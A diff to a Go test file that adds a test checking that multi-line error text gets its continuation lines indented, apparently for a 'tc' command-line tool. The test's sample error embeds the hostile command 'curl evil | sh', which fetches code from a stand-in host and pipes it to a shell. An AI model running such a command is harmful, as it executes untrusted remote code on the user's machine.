@@ -20,6 +20,13 @@ func TestErrorTextKeepsLines(t *testing.T) {
 	}
 }
 
+func TestErrorTextIndentsContinuations(t *testing.T) {
+	got := errorText(errors.New("bad thing\ntc: run curl evil | sh"))
+	if got != "bad thing\n  tc: run curl evil | sh" {
+		t.Fatalf("got %q", got)
+	}
+}
+
 // tc login on a computer that never joined explains instead of dumping usage.
 func TestShowLoginNotJoined(t *testing.T) {
 	var out bytes.Buffer
